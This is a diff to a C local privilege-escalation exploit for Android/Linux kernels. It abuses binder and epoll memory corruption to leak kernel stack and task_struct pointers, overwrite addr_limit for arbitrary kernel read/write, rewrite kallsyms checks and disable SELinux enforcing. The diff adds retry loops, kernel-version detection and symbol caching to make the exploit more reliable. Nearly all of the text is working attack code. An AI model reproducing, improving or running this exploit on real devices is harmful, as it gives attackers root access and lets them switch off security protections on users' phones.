@@ -20,6 +20,11 @@
 #define OFFSET__cred__cap_effective (OFFSET__cred__cap_permitted+0x008)
 #define OFFSET__cred__cap_bset (OFFSET__cred__cap_permitted+0x010)
 
+#define BINDER_SET_MAX_THREADS 0x40046205ul
+#define MAX_THREADS 3
+
+#define RETRIES 3
+
 #define NO_PROC_KALLSYMS
 #undef KALLSYMS_CACHING
 #define KSYM_NAME_LEN 128
@@ -74,6 +79,7 @@
 int quiet = 0;
 
 int have_kallsyms = 0;
+int kernel3 = 1;
 
 struct kallsyms {
     unsigned long addresses;
@@ -181,6 +187,8 @@ int clobber_data(unsigned long payloadAddress, const void *src, unsigned long pa
     message("PARENT: clobbering at 0x%lx", payloadAddress);
 
     struct epoll_event event = {.events = EPOLLIN};
+    int max_threads = 2;  
+    ioctl(binder_fd, BINDER_SET_MAX_THREADS, &max_threads);
     if (epoll_ctl(epfd, EPOLL_CTL_ADD, binder_fd, &event))
         error( "epoll_add");
 
@@ -265,25 +273,29 @@ int clobber_data(unsigned long payloadAddress, const void *src, unsigned long pa
     message("PARENT: readv returns %d, expected %d", b, totalLength);
 
     if (testDatum != testValue)
-        error( "clobber value doesn't match: is %lx but should be %lx", testDatum, testValue);
+        message( "PARENT: **fail** clobber value doesn't match: is %lx but should be %lx", testDatum, testValue);
     else
-        message("PARENT: Clobbering test passed.");
+        message("PARENT: clobbering test passed");
 
     free(dummyBuffer);
     close(pipes[0]);
     close(pipes[1]);
 
-    return testDatum != testValue;
+    return testDatum == testValue;
 }
 
-void leak_data(void *leakBuffer, int leakAmount,
+int leak_data(void *leakBuffer, int leakAmount,
                unsigned long extraLeakAddress, void *extraLeakBuffer, int extraLeakAmount,
                unsigned long *task_struct_ptr_p, unsigned long *kstack_p)
 {
     unsigned long const minimumLeak = TASK_STRUCT_OFFSET_FROM_TASK_LIST + 8;
     unsigned long adjLeakAmount = MAX(leakAmount, 4336); // TODO: figure out why we need at least 4336; I would think that minimumLeak should be enough
+    
+    int success = 1;
 
     struct epoll_event event = {.events = EPOLLIN};
+    int max_threads = 2;  
+    ioctl(binder_fd, BINDER_SET_MAX_THREADS, &max_threads);
     if (epoll_ctl(epfd, EPOLL_CTL_ADD, binder_fd, &event))
         error( "epoll_add");
 
@@ -332,9 +344,9 @@ void leak_data(void *leakBuffer, int leakAmount,
         error( "fork");
     if (fork_ret == 0)
     {
-        int failed = 0;
-        
         /* Child process */
+        char childSuccess = 1;
+        
         prctl(PR_SET_PDEATHSIG, SIGKILL);
         usleep(DELAY_USEC);
         message("CHILD: Doing EPOLL_CTL_DEL.");
@@ -358,6 +370,7 @@ void leak_data(void *leakBuffer, int leakAmount,
 
         if (!isKernelPointer(addr)) {
             badPointer = 1;
+            childSuccess = 0;
         }
         
         unsigned long task_struct_ptr = 0;
@@ -375,31 +388,40 @@ void leak_data(void *leakBuffer, int leakAmount,
                 task_struct_ptr + 8,
                 8};
             message("CHILD: clobbering with extra leak structures");
-            clobber_data(addr, &extra, sizeof(extra));
-            message("CHILD: clobbered");
+            if (clobber_data(addr, &extra, sizeof(extra))) 
+                message("CHILD: clobbered");
+            else {
+                message("CHILD: **fail** iovec clobbering didn't work");
+                childSuccess = 0;
+            }
         }
 
         errno = 0;
         if (read(pipefd[0], dataBuffer + minimumLeak, adjLeakAmount - minimumLeak) != adjLeakAmount - minimumLeak)
-            error( "leaking");
+            error("leaking");
 
         write(leakPipe[1], dataBuffer, adjLeakAmount);
 
         if (extraLeakAmount > 0)
         {
             message("CHILD: extra leak");
-            if (read(pipefd[0], extraLeakBuffer, extraLeakAmount) != extraLeakAmount)
+            if (read(pipefd[0], extraLeakBuffer, extraLeakAmount) != extraLeakAmount) {
+                childSuccess = 0;
                 error( "extra leaking");
+            }
             write(leakPipe[1], extraLeakBuffer, extraLeakAmount);
             //hexdump_memory(extraLeakBuffer, (extraLeakAmount+15)/16*16);
         }
         if (kstack_p != NULL)
         {
-            if (read(pipefd[0], dataBuffer, 8) != 8)
+            if (read(pipefd[0], dataBuffer, 8) != 8) {
+                childSuccess = 0;
                 error( "leaking kstack");
+            }
             message("CHILD: task_struct_ptr = 0x%lx", *(unsigned long *)dataBuffer);
             write(leakPipe[1], dataBuffer, 8);
         }
+        write(leakPipe[1], &childSuccess, 1);
 
         close(pipefd[0]);
         close(pipefd[1]);
@@ -409,23 +431,29 @@ void leak_data(void *leakBuffer, int leakAmount,
         
         if (badPointer) {
             errno = 0;
-            error("problematic address pointer, e.g., %lx", addr);
+            message("CHILD: **fail** problematic address pointer, e.g., %lx", addr);
         }
         exit(0);
     }
-    ioctl(binder_fd, BINDER_THREAD_EXIT, NULL);
-    message("PARENT: Calling WRITEV");
+    message("PARENT: soon will be calling WRITEV");
     errno = 0;
+    ioctl(binder_fd, BINDER_THREAD_EXIT, NULL);
     b = writev(pipefd[1], iovec_array, IOVEC_ARRAY_SZ);
     message("PARENT: writev() returns 0x%x", (unsigned int)b);
-    if (b != totalLength)
-        error( "writev() returned wrong value: needed 0x%lx", totalLength);
+    if (b != totalLength) {
+        message( "PARENT: **fail** writev() returned wrong value: needed 0x%lx", totalLength);
+        success = 0;
+        goto DONE;
+    }
 
     message("PARENT: Reading leaked data");
 
     b = read(leakPipe[0], dataBuffer, adjLeakAmount);
-    if (b != adjLeakAmount)
-        error( "reading leak: read 0x%x needed 0x%lx", b, adjLeakAmount);
+    if (b != adjLeakAmount) {
+        message( "PARENT: **fail** reading leak: read 0x%x needed 0x%lx", b, adjLeakAmount);
+        success = 0;
+        goto DONE;
+    }
 
     if (leakAmount > 0)
         memcpy(leakBuffer, dataBuffer, leakAmount);
@@ -434,19 +462,33 @@ void leak_data(void *leakBuffer, int leakAmount,
     {
         message("PARENT: Reading extra leaked data");
         b = read(leakPipe[0], extraLeakBuffer, extraLeakAmount);
-        if (b != extraLeakAmount)
-            error( "reading extra leak: read 0x%x needed 0x%x", b, extraLeakAmount);
+        if (b != extraLeakAmount) {
+            message( "PARENT: **fail** reading extra leak: read 0x%x needed 0x%lx", b, extraLeakAmount);
+            success = 0;
+            goto DONE;
+        }
     }
 
     if (kstack_p != NULL)
     {
-        if (read(leakPipe[0], kstack_p, 8) != 8)
-            error( "reading kstack");
+        if (read(leakPipe[0], kstack_p, 8) != 8) {
+            message( "PARENT: **fail** reading leaked kstack");
+            success = 0;
+            goto DONE;
+        }
     }
+    
+    char childSucceeded=0;
+    
+    read(leakPipe[0], &childSucceeded, 1);
+    if (!childSucceeded)
+        success = 0;
+    
 
     if (task_struct_ptr_p != NULL)
         memcpy(task_struct_ptr_p, dataBuffer + TASK_STRUCT_OFFSET_FROM_TASK_LIST, 8);
 
+DONE:    
     close(pipefd[0]);
     close(pipefd[1]);
     close(leakPipe[0]);
@@ -458,7 +500,10 @@ void leak_data(void *leakBuffer, int leakAmount,
 
     free(dataBuffer);
 
-    message("PARENT: Done with leaking");
+    if (success) 
+        message("PARENT: leaking successful");
+    
+    return success;
 }
 
 int kernel_rw_pipe[2];
@@ -553,6 +598,8 @@ void kernel_write_uchar(unsigned long kaddr, unsigned char data)
 // Make the kallsyms module not check for permission to list symbol addresses
 int fixKallsymsFormatStrings(unsigned long start)
 {
+    errno = 0;
+    
     int found = 0;
 
     start &= ~(PAGE - 1);
@@ -749,13 +796,17 @@ int loadKallsyms() {
     message("MAIN: kallsyms names end at 0x%lx", offset);    
     struct kernel_buffer buf = {.pageBufferOffset = 0};
 
-    if ((offset & 0xFF) == 0) {
-        if (kernel_read_ulong(offset+40) == 0 && kernel_read_ulong(offset+48) == 0) 
-            offset += 0x100;
-    }
-    else
-        kallsyms.names = (offset+0x100) & ~0xFFul;
+    offset = (offset + 0xFFul) & ~0xFFul;
+
+    unsigned long count = kernel_read_ulong(offset);
+    offset += 8;
     
+    if (count != kallsyms.num_syms) {
+        message("MAIN: **fail** kallsym entry count mismatch %ld", count);
+    }
+
+    offset = (offset + 0xFFul) & ~0xFFul;
+
     kallsyms.names = offset;
     
     for (unsigned long i = 0 ; i < kallsyms.num_syms ; i++) {
@@ -812,6 +863,8 @@ unsigned long findSymbol_memory_search(char* symbol) {
     for(unsigned long i = 0; i < kallsyms.num_syms; i++) {
         unsigned int n = get_kallsym_name(offset, name);
         if (!strcmp(name+1, symbol)) {
+            message( "found symbol in kernel memory", symbol);
+            
             return kernel_read_ulong(kallsyms.addresses + i*8);
         }
         offset += n;
@@ -820,10 +873,72 @@ unsigned long findSymbol_memory_search(char* symbol) {
     return 0;
 }
 
+char* allocateSymbolCachePathName(char* execName, char* symbol) {
+    char* p = strrchr(execName, '/');
+    unsigned n;
+    if (p == NULL)
+        n = 0;
+    else
+        n = p-execName+1;
+
+    char* pathname = malloc(strlen(symbol)+7+1+n);
+    if (pathname == NULL) {
+        errno = 0;
+        error("allocating memory for pathname");
+    }
+    strncpy(pathname, execName, n);
+    pathname[n] = 0;
+    strcat(pathname, symbol);
+    strcat(pathname, ".symbol");
+
+    return pathname;
+}
+
+unsigned long findSymbol_in_cache(char* execName, char* symbol) {
+    char* pathname = allocateSymbolCachePathName(execName, symbol);
+    unsigned long address = 0;
+    
+    FILE *cached = fopen(pathname, "r");
+    if (cached != NULL) {
+        fscanf(cached, "%lx", &address);
+        fclose(cached);
+    }
+    
+    free(pathname);
+    
+    return address;
+}
+
+void cacheSymbol(char* execName, char* symbol, unsigned long address) {
+#ifdef KALLSYMS_CACHING
+    if (address != 0 && address != findSymbol_in_cache(execName, symbol)) {
+        char* pathname = allocateSymbolCachePathName(execName, symbol);
+        FILE *cached = fopen(pathname, "w");
+        if (cached != NULL) {
+            fprintf(cached, "%lx\n", address);
+            fclose(cached);
+            char* cmd = alloca(10+strlen(pathname)+1);
+            sprintf(cmd, "chmod 666 %s", pathname);
+            system(cmd);
+            message("cached %s", pathname);
+        }
+        free(pathname);
+    }
+#endif
+}
+    
 unsigned long findSymbol(char* execName, unsigned long pointInKernelMemory, char *symbol)
 {
+    unsigned long address = 0;
+    
+#ifdef KALLSYMS_CACHING    
+    address = findSymbol_in_cache(execName, symbol);
+    if (address != 0)
+        return address;
+#endif
+    
 #ifdef NO_PROC_KALLSYMS
-    return findSymbol_memory_search(symbol);
+    address = findSymbol_memory_search(symbol);
 #else    
     char buf[1024];
     buf[0] = 0;
@@ -837,74 +952,61 @@ unsigned long findSymbol(char* execName, unsigned long pointInKernelMemory, char
     if (ks != NULL)
         fclose(ks);
     
-    char* p = strrchr(execName, '/');
-    unsigned n;
-    if (p == NULL)
-        n = 0;
-    else
-        n = p-execName+1;
-    
-#ifdef KALLSYMS_CACHING    
-    char* pathname = alloca(strlen(symbol)+7+1+n);
-    strncpy(pathname, execName, n);
-    pathname[n] = 0;
-    strcat(pathname, symbol);
-    strcat(pathname, ".symbol");
-#endif    
-    
-    if (buf[0] == 0 || strncmp(buf, "0000000000000000", 16) == 0) {
-        unsigned long address = 0;
-#ifdef KALLSYMS_CACHING        
-        FILE *cached = fopen(pathname, "r");
-        if (cached != NULL) {
-            fscanf(cached, "%lx", &address);
-            fclose(cached);
-        }
-        if (address != 0) {
-            message("MAIN: read address %lx from cache", address);
-            return address;
-        }
-#endif
-        if (fixKallsymsFormatStrings(pointInKernelMemory) == 0)
-        {
-            error( "Cannnot fix kallsyms format string");
-        }
-    }
-
-    ks = fopen("/proc/kallsyms", "r");
-    while (NULL != fgets(buf, sizeof(buf), ks)) 
+    if ( (buf[0] == 0 || strncmp(buf, "0000000000000000", 16) == 0) && fixKallsymsFormatStrings(pointInKernelMemory) == 0)
     {
-        unsigned long address;
-        unsigned char type;
-        char sym[1024];
-        sscanf(buf, "%lx %c %s", &address, &type, sym);
-        if (!strcmp(sym, symbol)) // && p[l] == '\x0A')
-        {
-            fclose(ks);
-
-#ifdef KALLSYMS_CACHING    
-            FILE *cached = fopen(pathname, "w");
-            if (cached != NULL) {
-                fprintf(cached, "%lx\n", address);
-                fclose(cached);
-                char* cmd = alloca(10+strlen(pathname)+1);
-                sprintf(cmd, "chmod 666 %s", pathname);
-                system(cmd);
-            }
-#endif
-            return address;
-        }
+        message( "MAIN: **partial failure** cannnot fix kallsyms format string");
+        address = findSymbol_memory_search(symbol);
     }
+    else {
+        ks = fopen("/proc/kallsyms", "r");
+        while (NULL != fgets(buf, sizeof(buf), ks)) 
+        {
+            unsigned long a;
+            unsigned char type;
+            char sym[1024];
+            sscanf(buf, "%lx %c %s", &a, &type, sym);
+            if (!strcmp(sym, symbol)) {
+                message( "found %s in /proc/kallsyms", sym);
+                address = a;
+                break;
+            }
+        }
 
-    fclose(ks);
-    return 0;
-#endif    
+        fclose(ks);
+    }
+#endif
+
+    return address;
+}
+
+void checkKernelVersion() {
+    kernel3 = 1;
+    FILE *k = fopen("/proc/version", "r");
+    if (k != NULL) {
+        char buf[1024]="";
+        fgets(buf, sizeof(buf), k);
+        if (NULL != strstr(buf, "Linux version 4"))
+            kernel3 = 0;
+    }
+    if (kernel3) message("MAIN: detected kernel version 3");
+        else message("MAIN: detected kernel version other than 3");
 }
 
 int main(int argc, char **argv)
 {
     if (argc >= 2)
         quiet = 1;
+    
+    if (argc >= 2) {
+        if (0 == strcmp(argv[1], "-quiet")) {
+            quiet = 1;
+            for (int i=1; i<argc-1; i++)
+                argv[i] = argv[i+1];
+            argc--;
+        }
+    }
+    
+    checkKernelVersion();
 
     message("MAIN: starting exploit for devices with waitqueue at 0x98");
 
@@ -916,16 +1018,39 @@ int main(int argc, char **argv)
 
     unsigned long kstack = 0xDEADBEEFDEADBEEFul;
     unsigned long task_struct_ptr = 0xDEADBEEFDEADBEEFul;
-    leak_data(NULL, 0, 0, NULL, 0, &task_struct_ptr, &kstack);
+    int try = 0;
+    while (try < RETRIES && !leak_data(NULL, 0, 0, NULL, 0, &task_struct_ptr, &kstack)) {
+        message("MAIN: **fail** retrying");
+        try++;
+    }
+    if (try == RETRIES) {
+        error("Failed to leak data");
+    }
+    else if (try > 0) {
+        message("MAIN: took %d tries but did it", try);
+    }
+    
+    unsigned long thread_info_ptr = kernel3 ? kstack : task_struct_ptr;
+    
     message("MAIN: task_struct_ptr = %lx", (unsigned long)task_struct_ptr);
-    message("MAIN: stack = %lx", kstack);
+    if (kernel3) 
+        message("MAIN: stack = %lx", kstack);
     message("MAIN: Clobbering addr_limit");
     unsigned long const src = 0xFFFFFFFFFFFFFFFEul;
-    clobber_data(kstack + 8, &src, 8);
 
-    message("MAIN: current->kstack == 0x%lx", kernel_read_ulong(task_struct_ptr + OFFSET__task_struct__stack));
+    try = 0;
+    while(try < RETRIES && !clobber_data(thread_info_ptr + 8, &src, 8)) {
+        message("MAIN: **fail** retrying");
+        try++;
+    }
+    if (try == RETRIES) {
+        error("Failed to clobber addr_limit");
+    }
+    else if (try > 0) {
+        message("MAIN: took %d tries but did it", try);
+    }
 
-    unsigned long thread_info_ptr = kstack;
+    message("MAIN: thread_info = 0x%lx", thread_info_ptr);
 
     setbuf(stdout, NULL);
     message("MAIN: should have stable kernel R/W now");
@@ -991,13 +1116,15 @@ int main(int argc, char **argv)
         }
     }
 
-
     if (selinux_enforcing == 0)
-        message("MAIN: **FAIL** cannot find selinux_enforcing symbol");
+        message("MAIN: **FAIL** did not find selinux_enforcing symbol");
     else
     {
         kernel_write_uint(selinux_enforcing, 0);
         message("MAIN: disabled selinux enforcing");
+        
+    cacheSymbol(argv[0], "selinux_enforcing", selinux_enforcing);
+    message("MAIN: root privileges ready");
         
 /* process hangs if these are done */        
 //        unsigned long security_ptr = kernel_read_ulong(cred_ptr + OFFSET__cred__security);
